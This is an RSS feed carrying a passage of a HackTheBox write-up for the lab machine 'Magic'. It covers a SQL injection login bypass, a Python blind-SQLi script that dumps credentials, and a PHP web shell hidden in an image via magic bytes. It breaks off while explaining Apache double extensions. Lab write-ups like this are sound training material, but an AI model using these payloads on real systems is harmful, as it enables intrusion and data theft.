<?xml version="1.0" encoding="utf-8"?>






<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Alex Connat |Â Blog</title>
        <link>https://alexconnat.github.io/</link>
        <description>Personal Blog of Alex Connat</description>
        <generator>Hugo 0.71.0 https://gohugo.io/</generator>
        
            <language>en</language>
        
        
        
        
            <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright>
        
        <lastBuildDate>Thu, 09 Jul 2020 19:43:10 &#43;0200</lastBuildDate>
        
            <atom:link rel="self" type="application/rss&#43;xml" href="https://alexconnat.github.io/rss.xml" />
        
        
            <item>
                <title>HTB Write-Up - Magic</title>
                <link>https://alexconnat.github.io/posts/write-up-magic/</link>
                <guid isPermaLink="true">https://alexconnat.github.io/posts/write-up-magic/</guid>
                <pubDate>Wed, 20 May 2020 18:00:00 &#43;0200</pubDate>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</copyright>
                
                    <description>&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/magic-badge.png&#34; alt=&#34;Magic-Badge&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Magic&lt;/strong&gt; is a Linux machine rated medium on HackTheBox. After the bypass of a login portal via a SQL injection, the initial foothold is gained through a malicious file upload on the web application. Once having a shell as &lt;code&gt;www-data&lt;/code&gt;, we can then dump the content of the MySQL database to get the password of another user &lt;code&gt;theseus&lt;/code&gt; on the box. Finally, we exploit a SUID binary with the group privileges of this user to gain &lt;code&gt;root&lt;/code&gt; access.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;foothold&#34;&gt;Foothold&lt;/h1&gt;
&lt;h3 id=&#34;port-scan&#34;&gt;Port Scan&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Port&lt;/th&gt;
&lt;th&gt;Service&lt;/th&gt;
&lt;th&gt;Version&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;22&lt;/td&gt;
&lt;td&gt;ssh&lt;/td&gt;
&lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;80&lt;/td&gt;
&lt;td&gt;http&lt;/td&gt;
&lt;td&gt;Apache httpd 2.4.29 ((Ubuntu))  -  http-title: Magic Portfolio&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;We start by browsing the website http://10.10.10.185, we land on a page with a gallery of images. At the bottom of the website, a link redirects us to a login portal.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/website-landpage.png&#34; alt=&#34;website-landpage&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nothing in the HTML source of the page seems to indicate a potential CMS in use, and we did not find any hidden information as HTML comments either. So our best chance is to use &lt;code&gt;gobuster&lt;/code&gt; to discover some hidden directories.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We add the &lt;code&gt;-x php&lt;/code&gt; flag after having tested that http://10.10.10.185/index.php returns successfuly returns the home page.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;Gobuster&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;kali@kali:~$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://10.10.10.185 -x php

/index.php (Status: 200)
/images (Status: 301)
/login.php (Status: 200)
/assets (Status: 301)
/upload.php (Status: 302)
/logout.php (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The page &lt;code&gt;/upload.php&lt;/code&gt; seems interesting! Alas, it redirects us back to the login portal&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/login-portal.png&#34; alt=&#34;login-portal&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;At this point, we are pretty confident there must be a way to bypass this portal (&lt;em&gt;&lt;u&gt;Hint&lt;/u&gt;: Bruteforce is never the way&amp;hellip;&lt;/em&gt;)&lt;/p&gt;
&lt;h3 id=&#34;sql-injection---authentication-bypass&#34;&gt;SQL injection - Authentication Bypass&lt;/h3&gt;
&lt;p&gt;Testing for the most basic SQL injection in the &amp;ldquo;Username&amp;rdquo; field directly worked:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;user&#39; OR 1=1 #&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that there must be a Javascript thingy trying to prevent us to enter the space character inside these textfields, however this is just a client-side check AND it is easily circumvented just by copy-pasting your payload inside the input field ;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So we can access the &lt;code&gt;/upload.php&lt;/code&gt; page without being authenticated as a valid user. But we can go even further than that&amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;sql-injection---dumping-the-database&#34;&gt;SQL injection - Dumping the database&lt;/h3&gt;
&lt;p&gt;Now that we know this form is vulnerable to SQL injections, we might be able to retrieve information from the underlying database.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Observe the behaviour when you enter &lt;code&gt;user&#39; OR 1=1 #&lt;/code&gt; (i.e something which is &lt;strong&gt;True&lt;/strong&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You get a &lt;code&gt;302&lt;/code&gt; redirect to &lt;code&gt;/upload.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Observe the behaviour when you enter &lt;code&gt;user&#39; OR 1=2 #&lt;/code&gt; (i.e something which is &lt;strong&gt;False&lt;/strong&gt;)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You get a normal HTTP status code &lt;code&gt;200 OK&lt;/code&gt; back to &lt;code&gt;/login.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From these observations, we can design a very simple boolean blind SQL injection POC in python which will map the database and dump the content of its tables:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/python3&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.185/login.php&amp;#34;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ALPHABET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printable&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# For some reasons, the &amp;#39;space&amp;#39; character is always considered as valid, so remove it from our alphabet&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[*] Guessing database name...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char_nb&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ALPHABET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING(database(), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;whatever&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allow_redirects&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

        &lt;span class=&#34;c1&#34;&gt;# If the query is True, it will result in a 302 redirection to /upload.php :)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;302&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;char_nb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;# if you&amp;#39;re here, it means you didn&amp;#39;t hit any valid characters (most probably the end of the guessed string, or less probably the current character is not part of your ALPHABET)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] Did not find anything.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] Found: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;guess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;INSERT IMAGE SCREENCAST HERE&amp;hellip;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This above code tries to guess &lt;strong&gt;the name of the database&lt;/strong&gt;, character by character, but you can apply the same logic to retrieve &lt;strong&gt;any string&lt;/strong&gt;, character by character &amp;ndash;&amp;gt; Just replace the &lt;code&gt;database()&lt;/code&gt; in the above &lt;code&gt;sqli&lt;/code&gt; variable by a &lt;u&gt;string&lt;/u&gt; (Caution: Not an &lt;u&gt;array&lt;/u&gt;) you want to know.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For instance, to enumerate / guess the name of the db user:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;john&amp;#39; OR SUBSTRING(user(), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;To enumerate the names of tables from the database whose name was found above (&lt;code&gt;magic&lt;/code&gt;):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;paul&amp;#39; OR SUBSTRING((SELECT TABLE_NAME from information_schema.tables where TABLE_SCHEMA LIKE &amp;#39;magic%&amp;#39; LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;NB: Change the OFFSET to enumerate the second, the third table of the db (Spoiler Alert: there is only one table, named &lt;code&gt;login&lt;/code&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;To enumerate the columns of the above found table &lt;code&gt;login&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &amp;#39;login&amp;#39; LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;Spoiler: Found 3 columns:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OFFSET 0 : &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;OFFSET 1 : &lt;code&gt;username&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;OFFSET 2 : &lt;code&gt;password&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Finally, to enumerate the first username and password from the table &lt;code&gt;login&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT username FROM login LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;---&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;---&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;sqli&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;alex&amp;#39; OR SUBSTRING((SELECT password FROM login LIMIT 1 OFFSET 0), {char_nb}, 1) = &amp;#39;{c}&amp;#39; #&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;pre&gt;&lt;code&gt;[*] Guessing username of 1st user from table &#39;login&#39;...
[+] Found: admin

[*] Guessing password of 1st user from table &#39;login&#39;...
[+] Found: th3s3usw4sk1ng
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So now, even more conveniently, we can access the upload page in a legitimate fashion, using the above credentials!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NB: Trying to connect via SSH using this password and the above found db user &amp;ldquo;theseus&amp;rdquo; failed, because SSH password authentication was disabled (only pubkey authentication).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;malicious-file-upload&#34;&gt;Malicious file upload&lt;/h3&gt;
&lt;p&gt;The image upload portal allow you to&amp;hellip; well.. upload images :-)&lt;/p&gt;
&lt;p&gt;Whenever we try to upload something that &lt;em&gt;is not recognized&lt;/em&gt; as either a JPG or PNG image, we are prompted with the alert box shown below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Write-Up-Magic/alert-message.png&#34; alt=&#34;alert-message&#34;&gt;&lt;/p&gt;
&lt;p&gt;But whenever we upload a &lt;em&gt;legitimate&lt;/em&gt; image (e.g &lt;code&gt;sweet-little-poney.jpg&lt;/code&gt;), it gets displayed on the website homepage and hence we can see the path at which was saved: &lt;code&gt;/images/uploads/sweet-little-poney.jpg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The name of the box (Magic) hints us towards the direction of &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/Magic_number_(programming)&#34;&gt;magic bytes&lt;/a&gt;&amp;quot;. If we start the file containing our PHP payload by these bytes (choose your camp, PNG or JPG)&amp;hellip;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;PNG:&lt;/strong&gt; &lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JPG:&lt;/strong&gt; &lt;code&gt;FF D8 FF DB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;hellip; you can trick the command &lt;code&gt;file&lt;/code&gt; (or more generally, commands used to detect the true filetype of files) into thinking our PHP payload is actually an image.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Alternatively, we could have embed a comment containing our payload in the metadata of a JPG image using the &lt;code&gt;exiftool&lt;/code&gt; command line utility.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exiftool -Comment=&#39;&amp;lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#39; my-image.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
&lt;p&gt;But wait a minute? If we upload this &amp;ldquo;image&amp;rdquo; containing:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;\xFF\xD8\xFF\xDB
&amp;lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and then retrieve it, using curl, or your browser or whatever; the server will most probably &lt;strong&gt;render&lt;/strong&gt; it (or serve it as an image, with &lt;code&gt;Content-Type: image/xxx&lt;/code&gt;) and &lt;strong&gt;not execute it&lt;/strong&gt; as a PHP piece of code&amp;hellip;&lt;/p&gt;
&lt;p&gt;This is where we use our second trick: &lt;strong&gt;double extensions&lt;/strong&gt;! I learned that a special (mis?)configuration in Apache servers would make the server execute any file as valid PHP as long as &lt;strong&gt;one of its extensions&lt;/strong&gt; is &amp;ldquo;&lt;code&gt;.php&lt;/code&gt;&amp;rdquo;:&lt;/p&gt;
&lt;blockquote&gt;
